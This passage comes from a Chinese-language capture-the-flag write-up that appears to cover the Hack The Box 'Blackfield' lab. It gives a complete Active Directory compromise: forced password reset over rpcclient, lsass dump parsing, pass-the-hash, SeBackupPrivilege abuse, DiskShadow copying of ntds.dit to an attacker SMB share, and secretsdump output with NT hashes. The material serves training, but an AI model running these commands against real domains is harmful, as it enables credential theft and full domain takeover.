   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)

[+] IP: 10.10.10.192:445        Name: blackfield.local          Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                NO ACCESS       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share                                                                                                                       profiles$                                               READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share
[*] Closed 1 connections
                                                                                                           
~~~

使用bloodhound搜集信息

~~~
bloodhound-python -u support -p '#00^BlackKnight' -d blackfield.local  -ns 10.10.10.192 -c all  --zip
~~~

发现support用户可以更改audit2020用户的密码

![](Pasted%20image%2020250118131826.png)

尝试使用RPC更改密码

~~~
rpcclient -U support%#00^BlackKnight  10.10.10.192
rpcclient $> setuserinfo2 audit2020 23 Lizi123@
~~~

可以看到更改密码已经生效

~~~
┌──(lizi㉿lizi)-[~/htb/blackfield/kerbrute]
└─$ nxc smb 10.10.10.192 -u audit2020 -p 'Lizi123@'
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:Lizi123@

┌──(lizi㉿lizi)-[~/htb/blackfield/kerbrute]
└─$ nxc ldap 10.10.10.192 -u audit2020 -p 'Lizi123@'
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
LDAP        10.10.10.192    389    DC01             [+] BLACKFIELD.local\audit2020:Lizi123@

~~~

现在我们可以访问smb的forensic目录了

~~~
┌──(lizi㉿lizi)-[~/htb/blackfield/kerbrute]
└─$ smbclient   //10.10.10.192/forensic  -U audit2020%Lizi123@
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Feb 23 21:03:16 2020
  ..                                  D        0  Sun Feb 23 21:03:16 2020
  commands_output                     D        0  Mon Feb 24 02:14:37 2020
  memory_analysis                     D        0  Fri May 29 04:28:33 2020
  tools                               D        0  Sun Feb 23 21:39:08 2020
                                                                                                                                                                                                                                 5102079 blocks of size 4096. 1693075 blocks available
~~~

在memory_analysis目录下有lsass.zip（Local Security Authority Subsystem Service）

~~~
smb: \memory_analysis\> dir
  .                                   D        0  Fri May 29 04:28:33 2020
  ..                                  D        0  Fri May 29 04:28:33 2020
  conhost.zip                         A 37876530  Fri May 29 04:25:36 2020
  ctfmon.zip                          A 24962333  Fri May 29 04:25:45 2020
  dfsrs.zip                           A 23993305  Fri May 29 04:25:54 2020
  dllhost.zip                         A 18366396  Fri May 29 04:26:04 2020
  ismserv.zip                         A  8810157  Fri May 29 04:26:13 2020
  lsass.zip                           A 41936098  Fri May 29 04:25:08 2020
  mmc.zip                             A 64288607  Fri May 29 04:25:25 2020
  RuntimeBroker.zip                   A 13332174  Fri May 29 04:26:24 2020
  ServerManager.zip                   A 131983313  Fri May 29 04:26:49 2020
  sihost.zip                          A 33141744  Fri May 29 04:27:00 2020
  smartscreen.zip                     A 33756344  Fri May 29 04:27:11 2020
  svchost.zip                         A 14408833  Fri May 29 04:27:19 2020
  taskhostw.zip                       A 34631412  Fri May 29 04:27:30 2020
  winlogon.zip                        A 14255089  Fri May 29 04:27:38 2020
  wlms.zip                            A  4067425  Fri May 29 04:27:44 2020
  WmiPrvSE.zip                        A 18303252  Fri May 29 04:27:53 2020
                                                                                                                                                                                                                                 5102079 blocks of size 4096. 1693694 blocks available
~~~

解压出来使用pypykatz进行转储哈希

![](Pasted%20image%2020250118160207.png)

利用hash进行登录

~~~
evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i blackfield.local
~~~

在bloodhound中发现svc_backup用户属于backup operator组，可以备份转储文件

从注册表中转储SAM和system文件

~~~
reg.exe save hklm\sam c:\programdata\sam
reg.exe save hklm\system c:\programdata\system
~~~

~~~
*Evil-WinRM* PS C:\programdata> download sam.sav
                                        
Info: Downloading C:\programdata\sam.sav to sam.sav
                                        
Info: Download successful!
*Evil-WinRM* PS C:\programdata> download system.sav
                                        
Info: Downloading C:\programdata\system.sav to system.sav
                                        
Info: Download successful!

~~~

使用impacket-secretsdump导出hash

~~~
┌──(kali㉿kali)-[~/blackfield]
└─$ impacket-secretsdump LOCAL -system system.sav -sam sam.sav
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up... 

~~~

但是这里的哈希是无效的，因为域控制器的身份验证不通过这个生效，而是通过NTDS.DIT验证，所以要转储NTDS.DIT

这个[仓库](https://github.com/giuliano108/SeBackupPrivilege)提供了滥用可能
进行上传
~~~
*Evil-WinRM* PS C:\programdata> upload SeBackupPrivilegeCmdLets.dll
                                        
Info: Uploading /home/kali/blackfield/SeBackupPrivilegeCmdLets.dll to C:\programdata\SeBackupPrivilegeCmdLets.dll
                                        
Data: 16384 bytes of 16384 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\programdata> upload SeBackupPrivilegeUtils.dll
                                        
Info: Uploading /home/kali/blackfield/SeBackupPrivilegeUtils.dll to C:\programdata\SeBackupPrivilegeUtils.dll
                                        
Data: 21844 bytes of 21844 bytes copied
                                        
Info: Upload successful!

~~~

导入当前会话

~~~
*Evil-WinRM* PS C:\programdata> import-module .\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\programdata> import-module .\SeBackupPrivilegeUtils.dll
~~~

可以把原本无法读取的文件复制到其他路径，然后使用type读取

~~~
Copy-FileSeBackupPrivilege netlogon.dns \programdata\netlogon.dns
~~~

### DiskShadow

[diskshadow](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow)是windows自带的可执行文件、[中文版](https://learn.microsoft.com/zh-cn/windows-server/administration/windows-commands/diskshadow)
[相关博客](https://pentestlab.blog/tag/diskshadow/)
提供了交互式和脚本两种方式，因为常规的shell缺乏交互性所以使用脚本

编写脚本lizi.dsh

~~~
set context persistent nowriters 
set metadata c:\programdata\lizi.cab 
set verbose on 
add volume c: alias lizi 
create
expose %lizi% x:
~~~

然后使用unix2dos对脚本进行转换

~~~
┌──(kali㉿kali)-[~/blackfield]
└─$ unix2dos lizi.dsh 
unix2dos: converting file lizi.dsh to DOS format...
~~~

把c盘挂载到x盘上

~~~
*Evil-WinRM* PS C:\programdata> diskshadow /s c:\programdata\lizi.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  1/21/2025 9:48:37 AM

-> set context persistent nowriters
-> set metadata c:\programdata\lizi.cab
The existing file will be overwritten.
-> add volume c: alias lizi
-> create
Alias lizi for shadow ID {3fadf01d-f90c-46a3-9240-25ffc699ff40} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {c3feccf0-afd7-45fc-8a50-fc4e5a1691bd} set as environment variable.

Querying all shadow copies with the shadow copy set ID {c3feccf0-afd7-45fc-8a50-fc4e5a1691bd}

        * Shadow copy ID = {3fadf01d-f90c-46a3-9240-25ffc699ff40}               %lizi%
                - Shadow copy set: {c3feccf0-afd7-45fc-8a50-fc4e5a1691bd}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 1/21/2025 9:48:38 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %lizi% x:
-> %lizi% = {3fadf01d-f90c-46a3-9240-25ffc699ff40}
The shadow copy was successfully exposed as x:\.
->
->

~~~

在本地开启smb服务

~~~
impacket-smbserver lizishare . -username lizi -password 'smbpassword' -smb2support 
~~~

靶机上认证smb

~~~
*Evil-WinRM* PS C:\programdata> net use \\10.10.16.4\lizishare /u:lizi smbpassword
The command completed successfully.
~~~

利用脚本中的函数把挂载在x盘下的文件传到我们的smb服务器上

~~~
Copy-FileSeBackupPrivilege x:\Windows\ntds\ntds.dit \\10.10.16.4\lizishare\ntds.dit
~~~

利用system和ntds.dit可以还原出哈希

~~~
┌──(kali㉿kali)-[~/blackfield]
└─$ impacket-secretsdump -system system -ntds ntds.dit LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::

~~~

使用哈希成功登录

~~~
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
blackfield\administrator
~~~
